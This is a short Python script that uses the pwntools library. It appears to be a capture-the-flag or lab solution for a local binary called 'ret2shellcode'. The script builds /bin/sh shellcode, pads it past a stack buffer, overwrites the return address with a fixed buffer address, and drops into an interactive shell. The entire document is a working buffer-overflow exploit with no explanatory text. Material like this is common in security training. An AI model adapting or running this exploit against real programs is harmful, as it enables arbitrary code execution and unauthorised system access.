# --*--coding:utf-8--*--
from pwn import *
p = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080
payload = shellcode.ljust((0x6c+4),'a')+p32(buf2_addr)
p.sendline(payload)
p.interactive()